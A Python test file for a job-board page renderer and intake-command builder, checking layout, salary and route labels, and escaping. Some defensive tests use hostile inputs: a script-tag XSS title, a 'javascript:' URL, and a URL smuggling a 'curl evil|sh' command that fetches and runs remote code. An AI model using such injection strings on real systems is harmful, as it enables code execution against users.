import re
from datetime import UTC, datetime

from cvforge.discover.page import render_jobs, route_label
from cvforge.discover.rows import Row
from cvforge.discover.run import RunResult
from cvforge.discover.screen import DROP_REASONS

NOW = datetime(2026, 10, 28, 8, 0, tzinfo=UTC)
URL = "https://boards.greenhouse.io/acme/jobs/101"


def row(**kw):
    base = {"market": "IE", "company": "Acme", "title": "Full Stack Engineer", "locations": ["Dublin"],
            "urls": [URL], "fit": "match", "matched": ["react", "node"], "route": "csep",
            "salary": {"currency": "EUR", "min": 60000, "max": 80000, "period": "year"},
            "tags": ["sponsor"], "first_seen": "2026-10-27", "new": True, "applied": None}
    base.update(kw)
    return Row(**base)


def result(rows, dropped=None):
    d = {r: 0 for r in DROP_REASONS}
    d.update(dropped or {"below-permit": 2})
    return RunResult(now=NOW, rows=rows, dropped=d, errors=["Globex (lever): HTTP 500"], boards=2, failed=1,
                     fetched=5, manual=[{"name": "Initech", "ats": "workday",
                                         "careers_url": "https://initech.example/careers"}])


def test_page_has_sections_rows_and_footer():
    html = render_jobs(result([row(), row(market="BR", title="Dev BR")]), None)
    assert html.index("Ireland") < html.index("Brazil")
    assert "Full Stack Engineer" in html
    assert "cvforge intake https://boards.greenhouse.io/acme/jobs/101" in html
    assert 'data-new="1"' in html and 'data-tagged="0"' in html and 'data-fit="match"' in html
    assert "60,000-80,000 EUR / year" in html
    assert "CSEP" in html and "first seen 2026-10-27" in html
    assert "below-permit: 2" in html
    for reason in DROP_REASONS:
        assert f"{reason}: " in html
    assert "Globex (lever): HTTP 500" in html
    assert "Check by hand" in html
    assert 'href="https://initech.example/careers"' in html
    assert "<title>Jobs: 2026-10-28</title>" in html


def test_new_recomputed_against_last_viewed_and_applied_section():
    seen = row(first_seen="2026-10-27", new=True)
    after = datetime(2026, 10, 28, tzinfo=UTC)
    assert 'data-new="0"' in render_jobs(result([seen]), after)
    applied = row(title="Done Role", applied={"date": "2026-10-20", "status": "applied"})
    html = render_jobs(result([applied]), None)
    assert "Already applied" in html and 'data-new="0"' in html


def test_empty_market_and_one_sided_salary_and_unknown():
    html = render_jobs(result([row(salary={"currency": "EUR", "min": 50000, "max": None, "period": "year"}),
                               ]), None)
    assert "No roles." in html  # Brazil is empty
    assert "50,000 EUR / year" in html
    assert "salary unknown" in render_jobs(result([row(salary=None)]), None)


def test_tagged_attribute():
    html = render_jobs(result([row(tags=["cloned ×3"]), row(tags=["sponsor"], title="B")]), None)
    assert 'data-tagged="1"' in html and 'data-tagged="0"' in html


def test_page_escapes_feed_text():
    html = render_jobs(result([row(title="<script>alert(1)</script>")]), None)
    assert "&lt;script&gt;" in html and "<script>alert" not in html


def test_non_web_url_gets_no_link():
    html = render_jobs(result([row(urls=["javascript:alert(1)"])]), None)
    assert 'href="javascript:alert(1)"' not in html
    assert ">open<" not in html


def test_open_link_for_web_url():
    assert f'href="{URL}"' in render_jobs(result([row()]), None)


def test_no_external_resources():
    html = render_jobs(result([row()]), None)
    assert not re.search(r'<(script|link|img)[^>]+(src|href)="https?://', html)


def test_route_label_never_bare_csep_for_degree_route():
    assert route_label("csep-if-degree") == "CSEP only if the degree is recognised, else GEP"
    assert route_label("csep") == "CSEP" and route_label("gep") == "GEP"
    assert route_label(None) == route_label("unknown") == "route unknown"


def test_intake_command_quotes_or_refuses():
    import shlex

    from cvforge.discover.rows import intake_command
    assert intake_command(URL) == f"cvforge intake {URL}"
    url = "https://x.example/a?b=1&c=2"
    assert shlex.split(intake_command(url)) == ["cvforge", "intake", url]
    evil = "https://x.example/a; curl evil|sh"
    assert intake_command(evil) is None
    assert intake_command("https://x.example/a b") is None
    assert intake_command("https://x.example/a\nb") is None
    assert intake_command("javascript:alert(1)") is None


def test_page_never_shows_unsafe_command():
    html = render_jobs(result([row(urls=["https://x.example/a; curl evil|sh"])]), None)
    card = html.split("<article")[1].split("</article>")[0]
    assert "cvforge intake" not in card and "<code>" not in card


def test_applied_without_date_and_dark_mode():
    html = render_jobs(result([row(applied={"date": None, "status": "applied"})]), None)
    assert "applied (date unknown)" in html and "applied None" not in html
    assert "prefers-color-scheme: dark" in html


def test_route_label_hidden_on_brazilian_cards():
    html = render_jobs(result([row(market="BR", title="Dev BR", route=None, tags=[])]), None)
    assert "Dev BR" in html and "route unknown" not in html
    assert "60,000-80,000 EUR / year</p>" in html
    html = render_jobs(result([row(route=None)]), None)
    assert "60,000-80,000 EUR / year | route unknown" in html
